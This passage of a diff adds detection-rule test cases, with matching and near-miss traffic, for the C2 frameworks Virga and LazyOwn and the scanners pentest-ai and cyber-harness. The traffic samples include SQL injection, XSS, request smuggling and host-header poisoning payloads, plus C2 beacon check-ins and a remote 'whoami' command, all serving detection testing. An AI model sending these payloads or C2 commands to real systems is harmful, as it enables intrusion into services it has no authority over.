+         response=ok('{"status":"ready","postgres":"ready","redis":"ready"}', ctype="application/json"))
+
+    # ---- integrate:virga
+    # ---- integrate:virga
+    # ---- Virga (r74tech/virga, reviewed at 43773ffe): beacon listener (internal/server/listener/http.go), MCP servers,
+    # ---- web UI and admin API. Beacon bodies are synthetic Base64 of the right shape, not real ciphertext.
+    vb = ("oaMSSHoJXuRNeWVGsN+Q7YF8rOidc15B9R1DYtn9Rp9Oo3Ca59tbY/Nd2s/+VSZpwVrJq2hDAq2sguA+sHjRoSe1qiePq8TkIwsNRumV4ZEAaajqbmqd90F1"
+          "uFNQfUEzjccwH+zLnWg20ENGP1cinCwY2qlOtzE81RmaJnVvkWx5rtX/qDGm0+FIAAE6PQq+iIz98BdT")
+    va = "xlD2ZfPTrPEP9qUzqv7fNXSA12/goWWoAljPdX9/ae5+qOp36TaKIaebYNYdt9gu2LkknczaxVKxPqnI1KGsJbTgNeVE5ywTF4/JR3AadrxCncvZVP6aEr62"
+    c96 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
+    vl = "198.19.0.5:8080"
+    http("virga beacon check-in with the generator default user agent", [3818401, 3818403],
+         post("/api/updates", vb, ua=c96, host=vl, ctype="text/plain"), client="int", server="ext", port=8080, response=ok(va, ctype="text/plain"))
+    http("virga beacon check-in with another user agent", [3818401],
+         post("/api/updates", vb, ua=BROWSER, host=vl, ctype="text/plain"), client="int", server="ext", port=8080, response=ok(va, ctype="text/plain"))
+    http("virga beacon stage 2 request", [3818402], get("/api/updates/stage2", ua=c96, host=vl), client="int", server="ext", port=8080,
+         response=ok(va, ctype="text/plain"))
+    http("virga listener decoy page", [3818404], get("/", host="10.2.0.5:8080"), port=8080,
+         response=ok("<html><body><h1>404 - Page Not Found</h1></body></html>", "404 Not Found", ctype="text/html; charset=utf-8"))
+    http("virga listener rejects a non-Base64 check-in", [3818405], post("/api/updates", "hello", host="10.2.0.5:8080", ctype="text/plain"), port=8080,
+         response=ok("Invalid base64 data\n", "400 Bad Request", headers="X-Content-Type-Options: nosniff\r\n", ctype="text/plain; charset=utf-8"))
+    vm = "10.2.0.5:50012"
+    http("virga mcp initialize answer", [3818406],
+         post("/mcp", '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-03-26","capabilities":{},"clientInfo":{"name":"inspector","version":"0.1"}}}', host=vm),
+         client="int", port=50012,
+         response=ok('{"jsonrpc":"2.0","id":1,"result":{"capabilities":{"tools":{"listChanged":true}},"protocolVersion":"2025-03-26","serverInfo":{"name":"Virga MCP Server","version":"1.0.0"}}}',
+                     ctype="application/json"))
+    http("virga mcp tool list", [3818407], post("/mcp", '{"jsonrpc":"2.0","id":2,"method":"tools/list"}', host=vm, headers="Mcp-Session-Id: 7f3c\r\n"),
+         client="int", port=50012,
+         response=ok('{"jsonrpc":"2.0","id":2,"result":{"tools":[{"name":"session_list","description":"List all active C2 sessions in the Virga C2 framework. Returns a comprehensive overview of all connected agents/beacons."}]}}',
+                     ctype="application/json"))
+    http("virga mcp session_command call", [3818408],
+         post("/mcp", '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"session_command","arguments":{"session_id":"a1b2c3d4","command":"whoami"}}}',
+              host=vm, headers="Mcp-Session-Id: 7f3c\r\n"), client="int", port=50012)
+    http("virga mcp interact_beacon call over sse", [3818408],
+         post("/mcp/message?sessionId=7f3c", '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name": "interact_beacon","arguments":{"session_id":"a1b2c3d4"}}}',
+              host="10.2.0.5:8444"), client="int", port=8444)
+    http("virga mcp sse stream", [3818409], get("/mcp/events", ua="curl/8.5.0", host="10.2.0.5:8444"), client="int", port=8444,
+         response=ok("event: endpoint\ndata: /mcp/message?sessionId=7f3c\n\n", ctype="text/event-stream"))
+    http("virga web ui from the vite dev server", [3818410], get("/", host="10.2.0.5:5173"), client="int", port=5173,
+         response=ok('<!doctype html>\n<html lang="ja">\n  <head>\n    <script type="module" src="/@vite/client"></script>\n\n    <meta charset="UTF-8" />\n'
+                     '    <link rel="icon" type="image/svg+xml" href="/vite.svg" />\n    <meta name="viewport" content="width=device-width, initial-scale=1.0" />\n'
+                     '    <title>Virga C2 - Web UI</title>\n  </head>\n  <body>\n    <div id="root"></div>\n    <script type="module" src="/src/main.tsx"></script>\n  </body>\n</html>\n'))
+    va8443 = "10.2.0.5:8443"
+    http("virga admin api forest answer", [3818411], get("/api/forest", host=va8443), port=8443,
+         response=ok('{"edges":[],"nodes":[{"id":"c2-server","type":"system","label":"Virga C2","status":"active","properties":{"hostname":"vps","ip":"10.2.0.5","os":"Server"},'
+                     '"createdAt":"2026-11-26T10:00:00Z","updatedAt":"2026-11-26T10:00:00Z"}]}\n', ctype="application/json"))
+    http("virga admin api listener list", [3818412], get("/api/listeners", host=va8443), port=8443,
+         response=ok('{"listeners":[{"name":"default-http","type":"http","bind_address":"127.0.0.1","port":8080,"status":"running"}],"success":true}\n',
+                     ctype="application/json"))
+    http("virga admin api empty session list", [3818413], get("/api/sessions", host=va8443), port=8443,
+         response=ok('{"sessions":[],"success":true}\n', ctype="application/json"))
+    http("virga admin api killswitch", [3818414], post("/api/sessions/3fa85f64-5717-4562-b3fc-2c963f66afa6/killswitch", "{}", host=va8443), port=8443)
+    http("virga admin api beacon-config", [3818414], post("/api/sessions/3fa85f64/beacon-config", '{"sleep_time":5,"jitter":10}', host=va8443), port=8443)
+    http("near miss: an app posting JSON to /api/updates", [], post("/api/updates", '{"channel":"stable","version":"1.2.3"}', host=vl),
+         client="int", server="ext", port=8080)
+    http("near miss: a short Base64 token posted to /api/updates", [], post("/api/updates", "dG9rZW4=", host=vl, ctype="text/plain"),
+         client="int", server="ext", port=8080)
+    http("near miss: another stage path", [], get("/api/updates/stages", host=vl), client="int", server="ext", port=8080)
+    http("near miss: an old Chrome 96 browser fetching a page", [], get("/", ua=c96, host="www.example.test"), client="int", server="ext")
+    http("near miss: an ordinary 404 page", [], get("/missing"), response=ok("<html><body><h1>404 Not Found</h1></body></html>", "404 Not Found"))
+    http("near miss: a page that quotes the base64 error", [], get("/docs"), response=ok("Invalid base64 data in field x"))
+    http("near miss: another MCP server initialize answer", [], post("/mcp", '{"jsonrpc":"2.0","id":1,"method":"initialize"}', host=vm), client="int", port=50012,
+         response=ok('{"jsonrpc":"2.0","id":1,"result":{"serverInfo":{"name":"files-mcp","version":"1.0.0"}}}', ctype="application/json"))
+    http("near miss: an MCP call to another tool", [],
+         post("/mcp", '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"/tmp/a"}}}', host=vm), client="int", port=50012)
+    http("near miss: a longer events path", [], get("/api/mcp/events/history", host="10.2.0.5:8444"), client="int", port=8444)
+    http("near miss: a page that names Virga C2", [], get("/blog/virga"), response=ok("<html><head><title>Virga C2 review</title></head></html>"))
+    http("near miss: another graph api", [], get("/api/graph", host=va8443), port=8443,
+         response=ok('{"edges":[],"nodes":[{"id":"core-router","type":"system","label":"Router","status":"active"}]}', ctype="application/json"))
+    http("near miss: another listener list", [], get("/api/listeners", host=va8443), port=8443,
+         response=ok('{"listeners":[{"name":"web","port":80}],"success":true}', ctype="application/json"))
+    http("near miss: another session list", [], get("/api/sessions", host=va8443), port=8443,
+         response=ok('{"sessions":[],"total":0}', ctype="application/json"))
+    http("near miss: a task added through another api", [], post("/api/sessions/3fa85f64/tasks", '{"command":"whoami"}', host=va8443), port=8443)
+
+    # ---- integrate:pentest-ai
+    # ---- integrate:pentest-ai
+    # ---- pentest-ai (0xSteph/pentest-ai, reviewed at b51ec6ee): branded requests, canaries, telemetry, API and MCP SSE
+    ptai_ua = "pentest-ai/1.6.2 (compatible; rv:3f2a9c0b71de; +https://pentestai.xyz)"
+    ptai_rid = "X-Request-ID: 7a3f9c21-4b08-4e11-9c02-3f2a9c0b71de\r\n"
+    http("pentest-ai probe request: user agent and request id", [3818001, 3818003], get("/login", ua=ptai_ua, headers=ptai_rid))
+    http("pentest-ai authenticated scan user agent", [3818001], get("/account", ua="pentest-ai/authscan (+https://pentestai.xyz)"))
+    http("pentest-ai stealth intensity: browser agent, request id kept by scan_headers callers", [3818003], get("/", headers=ptai_rid))
+    http("pentest-ai openapi discovery", [3818002, 3818003],
+         get("/openapi.json", ua="ptai-api-discovery/1.6.2 (compatible; rv:3f2a9c0b71de; +https://pentestai.xyz)", headers=ptai_rid))
+    http("pentest-ai open redirect oracle", [3818004],
+         get("/login?next=http%3A%2F%2Fr.pentestai.xyz%2Fstatic%2F7a3f9c21-4b08-4e11-9c02-3f2a9c0b71de.js%2F"))
+    http("pentest-ai cors probe origin", [3818005], get("/api/me", headers="Origin: https://ptai-cors-canary.example\r\n"))
+    http("pentest-ai host header poisoning probe", [3818005],
+         post("/api/reset", '{"email":"victim@app.example.test"}', headers="X-Forwarded-Host: ptai-host-canary.example\r\n"))
+    http("pentest-ai open redirect allowlist bypass", [3818006],
+         get("/redirect?to=https%3A%2F%2Fptai-canary.example%2F%3Fhttps%3A%2F%2Fapp.example.test%2Fhome"))
+    http("pentest-ai oauth pkce downgrade redirect_uri", [3818006],
+         get("/oauth/authorize?client_id=web&redirect_uri=https%3A%2F%2Fptai-pkce-canary.example%2Fcb&response_type=code"))
+    http("pentest-ai reflection oracle token", [3818007], get("/search?q=%3CptaiRX9173%3E"))
+    http("pentest-ai sqli oracle pair", [3818007], get("/products?name=ptaiZ%27+OR+%271%27%3D%271%27+--+"))
+    http("pentest-ai reflected xss payload in query", [3818007], get("/search?q=%3Cscript%3Ealert%28%27ptai%27%29%3C%2Fscript%3E"))
+    http("pentest-ai ssti control value", [3818007], get("/render?name=ptaictlZ9173"))
+    http("pentest-ai soft-404 baseline path", [3818008], get("/this-path-definitely-does-not-exist-ptai-canary"))
+    http("pentest-ai stored xss canary in body", [3818009], post("/api/comments", '{"text":"<ptaiSX9173>"}'))
+    http("pentest-ai sign-up on the canary domain", [3818009],
+         post("/api/register", '{"email":"ptai-0123456789ab@ptai-canary.example","password":"Ptai!x"}'))
+    http("pentest-ai fixed test account password", [3818010],
+         post("/api/Users", '{"email":"shopper@app.example.test","password":"Ptai-1234!Aa","passwordRepeat":"Ptai-1234!Aa"}'))
+    http("pentest-ai fixed test account password, form encoded", [3818010],
+         post("/signup", "email=shopper%40app.example.test&password=Ptai-1234%21Aa", ctype="application/x-www-form-urlencoded"))
+    http("pentest-ai upload probe boundary", [3818011],
+         post("/file-upload", "------ptaiUploadBoundary7MA4YWxkTrZu0gW--\r\n", ctype="multipart/form-data; boundary=----ptaiUploadBoundary7MA4YWxkTrZu0gW"))
+    http("pentest-ai xxe upload boundary", [3818011],
+         post("/api/import", "------ptaiXXEBoundary7MA4YWxkTrZu0gW--\r\n", ctype="multipart/form-data; boundary=----ptaiXXEBoundary7MA4YWxkTrZu0gW"))
+    smug = "GET /smuggled?token=PTAISMUG0123456789abcdef HTTP/1.1\r\nHost: app.example.test\r\n\r\n"
+    smug_body = "0\r\n\r\n" + smug
+    http("pentest-ai request smuggling probe", [3818012],
+         (f"POST / HTTP/1.1\r\nHost: app.example.test\r\nContent-Length: {len(smug_body)}\r\nTransfer-Encoding: chunked\r\n\r\n{smug_body}").encode())
+    http("pentest-ai xss payload in the user agent", [3818013], get("/search", ua="<script>alert('ptai')</script>"))
+    lookup("pentest-ai telemetry lookup", [3818014], "telemetry.pentestai.xyz")
+    lookup("pentest-ai cloud sync lookup", [3818014], "app.pentestai.xyz")
+    lookup("pentest-ai redirect canary lookup", [3818015], "r.pentestai.xyz")
+    tls_sni("pentest-ai telemetry sni", [3818016], "telemetry.pentestai.xyz")
+    http("pentest-ai telemetry user agent", [3818017],
+         post("/v1/event", '{"event":"engagement.start"}', ua="pentest-ai-telemetry/1.0", host="telemetry.pentestai.xyz"), client="int", server="ext")
+    ptai_api = "10.2.0.5:8888"
+    http("pentest-ai dashboard page", [3818018], get("/dashboard/", host=ptai_api), client="int", port=8888,
+         response=ok('<!DOCTYPE html>\n<html lang="en">\n<head>\n  <meta charset="UTF-8">\n  <title>pentest-ai · dashboard</title>\n'
+                     '  <meta name="robots" content="noindex, nofollow">\n</head>\n<body></body>\n</html>'))
+    http("pentest-ai openapi document", [3818019], get("/openapi.json", host=ptai_api), client="int", port=8888,
+         response=ok('{"openapi":"3.1.0","info":{"title":"pentest-ai","description":"Autonomous AI pentesting REST API","version":"1.6.2"},"paths":{}}',
+                     ctype="application/json"))
+    http("pentest-ai swagger page", [3818020], get("/docs", host=ptai_api), client="int", port=8888,
+         response=ok('<!DOCTYPE html>\n    <html>\n    <head>\n    <title>pentest-ai - Swagger UI</title>\n    </head>'))
+    ptai_sec = ("x-frame-options: DENY\r\nx-content-type-options: nosniff\r\nreferrer-policy: no-referrer\r\n"
+                "permissions-policy: camera=(), microphone=(), geolocation=()\r\n"
+                "content-security-policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; "
+                "font-src 'self' data:; connect-src 'self' ws: wss:; frame-ancestors 'none'; base-uri 'self'; form-action 'self'\r\n")
+    http("pentest-ai api root redirect", [3818021], get("/", host=ptai_api), client="int", port=8888,
+         response=f"HTTP/1.1 307 Temporary Redirect\r\nserver: uvicorn\r\ncontent-length: 0\r\nlocation: /dashboard/\r\n{ptai_sec}\r\n".encode())
+    http("pentest-ai write refused without the api token", [3818022], post("/engagements", '{"target":"https://app.example.test"}', host=ptai_api),
+         client="int", port=8888,
+         response=ok('{"detail":"State-mutating endpoints require PENTEST_AI_API_TOKEN env var. Set it on the server before calling write endpoints."}',
+                     "503 Service Unavailable", ctype="application/json"))
+    http("pentest-ai mcp sse missing token", [3818023], get("/sse", host="10.2.0.5:8765"), client="int", port=8765,
+         response=ok('{"error":"missing bearer token"}', "401 Unauthorized", headers='www-authenticate: Bearer realm="pentest-ai"\r\n',
+                     ctype="application/json"))
+    http("pentest-ai mcp sse host refused", [3818024], get("/sse", host="198.51.100.7:8765"), client="int", port=8765,
+         response=ok('{"error":"host not allowed","host":"198.51.100.7:8765"}', "403 Forbidden", ctype="application/json"))
+    http("near miss: another tool named pentest-ai without the project link", [], get("/", ua="pentest-ai/2.0 (other scanner)"))
+    http("near miss: an api client user agent", [], get("/openapi.json", ua="ptai-api/1.0"))
+    http("near miss: an ordinary random request id", [], get("/", headers="X-Request-ID: 7a3f9c21-0b1c-4d2e-8f30-123456789abc\r\n"))
+    http("near miss: a link to the project site", [], get("/docs?ref=pentestai.xyz"))
+    http("near miss: another cors canary origin", [], get("/api/me", headers="Origin: https://cors-canary.example\r\n"))
+    http("near miss: another redirect canary", [], get("/redirect?to=https%3A%2F%2Fother-canary.example%2F"))
+    http("near miss: a search for the word ptai", [], get("/search?q=ptai+tutorial"))
+    http("near miss: another soft-404 probe", [], get("/this-path-does-not-exist"))
+    http("near miss: a body that mentions ptai", [], post("/api/notes", '{"text":"ptai is a cli"}'))
+    http("near miss: a similar password", [], post("/api/Users", '{"email":"a@app.example.test","password":"Ptai-12345"}'))
+    http("near miss: the common multipart boundary suffix", [],
+         post("/file-upload", "------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n", ctype="multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"))
+    http("near miss: another smuggled path", [], get("/smuggled?token=abc"))
+    http("near miss: another xss test in the user agent", [], get("/search", ua="<script>alert('x')</script>"))
+    lookup("near miss: the project site", [], "pentestai.xyz")
+    lookup("near miss: the project site with www", [], "www.pentestai.xyz")
+    lookup("near miss: a name that ends like the canary host", [], "rr.pentestai.xyz")
+    tls_sni("near miss: the project site, sni", [], "pentestai.xyz")
+    http("near miss: a telemetry agent of another tool", [], post("/v1/event", "{}", ua="my-pentest-ai-telemetry/1.0"), client="int", server="ext")
+    http("near miss: a page about the dashboard", [], get("/"), client="int", response=ok("<title>pentest-ai docs</title>"))
+    http("near miss: another openapi document", [], get("/openapi.json"), client="int",
+         response=ok('{"info":{"title":"x","description":"AI pentesting API"}}', ctype="application/json"))
+    http("near miss: another swagger page", [], get("/docs"), client="int", response=ok("<title>Inventory - Swagger UI</title>"))
+    http("near miss: a redirect to /dashboard/ without the security headers", [], get("/", host=ptai_api), client="int", port=8888,
+         response=b"HTTP/1.1 307 Temporary Redirect\r\nserver: uvicorn\r\ncontent-length: 0\r\nlocation: /dashboard/\r\n\r\n")
+    http("near miss: another 503", [], get("/"), client="int", response=ok('{"detail":"Service Unavailable"}', "503 Service Unavailable", ctype="application/json"))
+    http("near miss: another bearer realm", [], get("/sse"), client="int", port=8765,
+         response=ok('{"error":"unauthorized"}', "401 Unauthorized", headers='www-authenticate: Bearer realm="api"\r\n', ctype="application/json"))
+    http("near miss: another 403 json", [], get("/sse"), client="int", port=8765,
+         response=ok('{"error":"host not found"}', "403 Forbidden", ctype="application/json"))
+
+    # ---- integrate:cyber-harness
+    # ---- integrate:cyber-harness
+    # ---- cyber-harness: strings from chainreactors/cyber-harness at 02ac8ecf (and v0.4.0 for the AIScan names).
+    #      Target-side requests come from Go's net/http (tools/scan/http_auth.go, tools/search/fetch.go,
+    #      tools/curl/client.go); the Web Hub answers from pkg/web/handler.go, pkg/web/service/auth.go and the built
+    #      web/frontend/index.html. Go writes response headers in sorted order.
+    ch_cors = ("Access-Control-Allow-Headers: Content-Type, Authorization, Connect-Protocol-Version, Connect-Timeout-Ms, "
+               "Connect-Content-Encoding, Connect-Accept-Encoding, Grpc-Timeout, Grpc-Encoding, Grpc-Accept-Encoding, X-Grpc-Web, "
+               "X-User-Agent\r\nAccess-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS\r\nAccess-Control-Allow-Origin: *\r\n"
+               "Access-Control-Expose-Headers: Connect-Content-Encoding, Grpc-Status, Grpc-Message, Grpc-Status-Details-Bin\r\n")
+    ch_hub = "10.2.0.5:8080"
+
+    def ch_page(title, key):
+        return ('<!DOCTYPE html>\n<html lang="en">\n  <head>\n    <meta charset="UTF-8" />\n'
+                '    <link rel="icon" href="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3C%2Fsvg%3E" />\n'
+                f'    <title>{title}</title>\n    <script>\n      ;(() => {{\n        try {{\n'
+                f"          const storedTheme = localStorage.getItem('{key}')\n"
+                "          const theme = storedTheme === 'light' || storedTheme === 'dark' ? storedTheme : 'light'\n"
+                "        } catch {\n          document.documentElement.style.colorScheme = 'light'\n        }\n      })()\n    </script>\n"
+                '    <script type="module" crossorigin src="/assets/index-D4c1x9Qa.js"></script>\n  </head>\n'
+                '  <body>\n    <div id="root"></div>\n  </body>\n</html>\n')
+
+    def ch_go_get(path, ua, extra=""):
+        return f"GET {path} HTTP/1.1\r\nHost: app.example.test\r\nUser-Agent: {ua}\r\n{extra}Accept-Encoding: gzip\r\n\r\n".encode()
+
+    basic = ok("unauthorized", "401 Unauthorized", headers='Www-Authenticate: Basic realm="admin"\r\n')
+    http("cyber-harness scan pipeline basic-auth probe", [3817601], ch_go_get("/admin/", "cyber", "Connection: close\r\n"), basic)
+    http("near miss: a user agent that starts with cyber", [], ch_go_get("/admin/", "CyberGhost/8.0", "Connection: close\r\n"), basic)
+    http("cyber-harness fetch tool", [3817602],
+         ch_go_get("/advisories/2026-11", "Mozilla/5.0 (compatible; cyber/1.0; +https://github.com/chainreactors/cyber-harness)",
+                   "Accept: text/markdown, text/html, text/plain, */*\r\nAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7\r\n"))
+    http("near miss: another bot naming cyber in its user agent", [],
+         ch_go_get("/", "Mozilla/5.0 (compatible; cyberbot/2.0; +https://bot.example.test/about)"))
+    http("cyber-harness AIScan build basic-auth probe", [3817603], ch_go_get("/manager/html", "aiscan", "Connection: close\r\n"), basic)
+    http("near miss: a user agent that starts with aiscan", [], ch_go_get("/manager/html", "aiscanner/1.2", "Connection: close\r\n"), basic)
+    http("cyber-harness AIScan build fetch tool", [3817604],
+         ch_go_get("/", "Mozilla/5.0 (compatible; aiscan/1.0; +https://github.com/chainreactors/aiscan)",
+                   "Accept: text/markdown, text/html, text/plain, */*\r\n"))
+    http("near miss: another aiscan crawler", [], ch_go_get("/", "Mozilla/5.0 (compatible; aiscan/2.0; +https://aiscan.example.test/bot)"))
+    ch_ua = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+    http("cyber-harness curl tool browser header set", [3817605],
+         ch_go_get("/login", ch_ua,
+                   "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,"
+                   "application/signed-exchange;v=b3;q=0.7\r\nAccept-Language: en-US,en;q=0.9\r\n"
+                   'Sec-Ch-Ua: "Chromium";v="133", "Google Chrome";v="133", "Not(A:Brand";v="24"\r\nSec-Ch-Ua-Mobile: ?0\r\n'
+                   'Sec-Ch-Ua-Platform: "Linux"\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\n'
+                   "Sec-Fetch-User: ?1\r\nUpgrade-Insecure-Requests: 1\r\n"))
+    http("near miss: Chrome 133 on Linux with its own brand list", [],
+         ch_go_get("/login", ch_ua, 'sec-ch-ua: "Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"\r\n'
+                   'sec-ch-ua-platform: "Linux"\r\n'))
+    mcp_resp = ok('{"jsonrpc":"2.0","id":0,"result":{}}', ctype="application/json")
+    http("cyber-harness MCP client initialize", [3817606],
+         post("/mcp", '{"jsonrpc":"2.0","id":0,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},'
+              '"clientInfo":{"name":"cyber-harness","version":"mcp-ext"}}}', ua="Go-http-client/1.1", host="mcp.example.test"),
+         mcp_resp, client="int", server="ext")
+    http("near miss: another MCP client named cyber-harness-ui", [],
+         post("/mcp", '{"jsonrpc":"2.0","id":0,"method":"initialize","params":{"clientInfo":{"name":"cyber-harness-ui","version":"1.0"}}}',
+              ua="Go-http-client/1.1", host="mcp.example.test"), mcp_resp, client="int", server="ext")
+    http("cyber-harness MCP client tool call id", [3817607],
+         post("/mcp", '{"jsonrpc":"2.0","id":"cyber-mcp-3","method":"tools/call","params":{"name":"decompile","arguments":{"addr":"0x401000"}}}',
+              ua="Go-http-client/1.1", host="mcp.example.test"), mcp_resp, client="int", server="ext")
+    http("near miss: a JSON-RPC id without the counter", [],
+         post("/mcp", '{"jsonrpc":"2.0","id":"cyber-mcp","method":"ping"}', ua="Go-http-client/1.1", host="mcp.example.test"),
+         mcp_resp, client="int", server="ext")
+    http("cyber-harness Web Hub page", [3817610, 3817612], get("/", host=ch_hub), client="int", port=8080,
+         response=ok(ch_page("Cyber", "cyber-theme"), headers=ch_cors + "Cache-Control: no-cache\r\n", ctype="text/html; charset=utf-8"))
+    http("near miss: another page titled Cyber with a cyber theme class", [], get("/", host="www.example.test"), client="int",
+         response=ok('<html><head><title>Cyber</title><link rel="stylesheet" href="/cyber-theme.css"></head><body></body></html>'))
+    http("cyber-harness AIScan build Web page", [3817611, 3817612], get("/", host=ch_hub), client="int", port=8080,
+         response=ok(ch_page("AIScan", "aiscan-theme"), headers=ch_cors + "Cache-Control: no-cache\r\n", ctype="text/html; charset=utf-8"))
+    http("near miss: another page titled AIScan", [], get("/", host="www.example.test"), client="int",
+         response=ok("<html><head><title>AIScan</title></head><body>AI scanning service</body></html>"))
+    http("cyber-harness Web Hub health with its CORS headers", [3817612], get("/health", host=ch_hub, ua="curl/8.11.1"), client="int",
+         port=8080, response=ok('{"status":"ok"}\n', headers=ch_cors, ctype="application/json"))
+    http("near miss: a ConnectRPC service with the usual CORS list", [], get("/health", host=ch_hub, ua="curl/8.11.1"), client="int",
+         port=8080, response=ok('{"status":"ok"}\n', ctype="application/json",
+                                headers="Access-Control-Allow-Headers: Content-Type, Connect-Protocol-Version, Connect-Timeout-Ms, "
+                                        "Grpc-Timeout, X-Grpc-Web, X-User-Agent\r\nAccess-Control-Allow-Origin: *\r\n"))
+    http("cyber-harness Web Hub API without the access key", [3817612, 3817613], get("/api/manifest", host=ch_hub), client="int",
+         port=8080, response=ok('{"error":"invalid or missing access key"}\n', "401 Unauthorized", headers=ch_cors, ctype="application/json"))
+    http("near miss: the same error text from a server without the Hub headers", [], get("/api/items", host=ch_hub), client="int",
+         port=8080, response=ok('{"error":"invalid or missing access key"}\n', "401 Unauthorized", ctype="application/json"))
+    http("cyber-harness Web Hub login", [3817612, 3817614], post("/api/auth/login", '{"token":"0123456789ABCDEFGHJKMNPQRS"}', host=ch_hub),
+         client="int", port=8080,
+         response=ok('{"status":"ok"}\n', ctype="application/json", headers=ch_cors + "Cache-Control: no-store\r\n"
+                     "Set-Cookie: cyber_session=q8YtV0d1fJ9w3Ck2bJmP0xg5rT6nH7aL1uE4sD2cB8k; Path=/; HttpOnly; SameSite=Strict\r\n"))
+    http("near miss: another site's cyber_session_id cookie", [], post("/login", "user=a&pass=b", ctype="application/x-www-form-urlencoded"),
+         client="int", response=ok("ok", headers="Set-Cookie: cyber_session_id=abc; Path=/; SameSite=Lax\r\n"))
+    http("cyber-harness AIScan build Web login", [3817615], post("/api/auth/login", '{"token":"replace-me"}', host=ch_hub),
+         client="int", port=8080,
+         response=ok('{"status":"ok"}\n', ctype="application/json",
+                     headers="Set-Cookie: aiscan_session=Zm9vYmFyYmF6; Path=/; HttpOnly; SameSite=Strict\r\n"))
+    http("near miss: an aiscan preference cookie", [], get("/", host="www.example.test"), client="int",
+         response=ok("ok", headers="Set-Cookie: aiscan_pref=dark; Path=/\r\n"))
+
+    def ch_ws(path):
+        return (f"GET {path} HTTP/1.1\r\nHost: {ch_hub}\r\nUser-Agent: Go-http-client/1.1\r\nConnection: Upgrade\r\n"
+                "Authorization: Bearer 0123456789ABCDEFGHJKMNPQRS\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
+                "Sec-WebSocket-Version: 13\r\nUpgrade: websocket\r\n\r\n").encode()
+    ws_101 = (b"HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
+              b"Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=\r\n\r\n")
+    case("cyber-harness node connecting to a Hub", [3817616], client="int", port=8080, request=ch_ws("/api/aop/node/ws"), response=ws_101)
+    case("near miss: a WebSocket under another prefix", [], client="int", port=8080, request=ch_ws("/v2/api/aop/node/ws"), response=ws_101)
+    case("cyber-harness Hub application WebSocket", [3817617], client="int", port=8080, request=ch_ws("/api/aop/application/ws"),
+         response=ws_101)
+    case("near miss: a similar application WebSocket path", [], client="int", port=8080, request=ch_ws("/api/aop/applications/ws"),
+         response=ws_101)
+    http("cyber-harness Hub ConnectRPC call", [3817612, 3817618],
+         post("/cyber.rpc.chat.SessionService/ListSessions", "{}", host=ch_hub, headers="Connect-Protocol-Version: 1\r\n"),
+         client="int", port=8080, response=ok('{"sessions":[]}', ctype="application/json", headers=ch_cors))
+    http("near miss: another ConnectRPC package named cyber.rpc.v1", [],
+         post("/cyber.rpc.v1.FooService/Bar", "{}", host="api.example.test", headers="Connect-Protocol-Version: 1\r\n"),
+         client="int", response=ok("{}", ctype="application/json"))
+
+    # ---- integrate:lazyown
+    # ---- LazyOwn: the LazyC2 server's answers and the beacon requests its handlers serve, from grisuno/LazyOwn at f4e54de9
+    c2 = "198.19.0.5:4444"
+    lz_csp = ("Content-Security-Policy: default-src 'self'; img-src 'self' data: https://upload.wikimedia.org; "
+              "style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com; "
+              "script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://unpkg.com https://cdn.jsdelivr.net; "
+              "script-src-elem 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://unpkg.com https://cdn.jsdelivr.net; "
+              "connect-src 'self'\r\n")
+    lz_hdrs = ("Server: Werkzeug/3.1.9 Python/3.11.2\r\nX-Content-Type-Options: nosniff\r\nX-Frame-Options: SAMEORIGIN\r\n"
+               "X-XSS-Protection: 1; mode=block\r\nReferrer-Policy: strict-origin-when-cross-origin\r\n")
+    http("lazyown c2 basic auth challenge on /", [3818101, 3818102], get("/", host=c2), port=4444, client="int", server="ext",
+         response=ok("Invalid credentials. Please provide valid username and password.\n", "401 UNAUTHORIZED",
+                     headers='WWW-Authenticate: Basic realm="Login Required"\r\n' + lz_hdrs + lz_csp, ctype="text/html; charset=utf-8"))
+    http("near miss: the classic flask basic auth snippet with the same realm", [], get("/", host="10.2.0.5:5000"), port=5000,
+         response=ok("Could not verify your access level for that URL.\nYou have to login with proper credentials", "401 UNAUTHORIZED",
+                     headers='WWW-Authenticate: Basic realm="Login Required"\r\n'))
+    http("near miss: another content security policy that allows wikimedia images", [], get("/wiki", host="10.2.0.5"),
+         response=ok("<html></html>", headers="Content-Security-Policy: default-src 'self'; img-src 'self' data: https://upload.wikimedia.org; "
+                                              "style-src 'self'\r\n"))
+    http("lazyown c2 login page with decoy mode off", [3818103], get("/login", host=c2), port=4444, client="int", server="ext",
+         response=ok('<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n'
+                     '    <title>LazyOwn Command and Control Center</title>\n</head><body><label for="username" class="form-label">Operator:</label>'
+                     '</body></html>'))
+    http("near miss: a page about the framework", [], get("/blog/lazyown"),
+         response=ok("<html><head><title>LazyOwn RedTeam Framework review</title></head></html>"))
+    http("lazyown c2 public health answer", [3818104], get("/api/health", host=c2, ua="curl/8.5.0"), port=4444, client="int", server="ext",
